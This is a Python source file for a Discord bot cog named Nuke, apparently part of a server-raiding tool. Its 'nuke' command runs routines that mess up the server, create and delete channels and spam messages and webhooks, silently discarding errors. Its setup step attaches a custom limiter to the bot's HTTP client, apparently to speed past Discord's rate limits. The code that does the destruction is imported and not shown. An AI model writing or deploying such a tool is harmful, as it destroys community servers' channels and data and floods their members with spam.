from __future__ import annotations
import asyncio
import time
import discord
from discord.ext import commands

from core.ratelimit import limiter
from core.operations import Operations


class Nuke(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.operations: Operations = bot.operations

    @commands.command(name="nuke")
    async def nuke(self, ctx: commands.Context) -> None:
        guild = ctx.guild
        if not self.operations:
            await ctx.reply("operations not initialized", delete_after=5)
            return

        try:
            await self.operations.mess_server(guild)
            await self.operations.CrChannel(guild)
            await self.operations.DelChannels(guild)
            await self.operations.spam(guild)
            await self.operations.spam_webhook(guild)
        except Exception as e:
            pass

async def setup(bot: commands.Bot) -> None:
    if not hasattr(bot.http, "fast_limiter"):
        bot.http.fast_limiter = limiter(bot.http)
    await bot.add_cog(Nuke(bot))
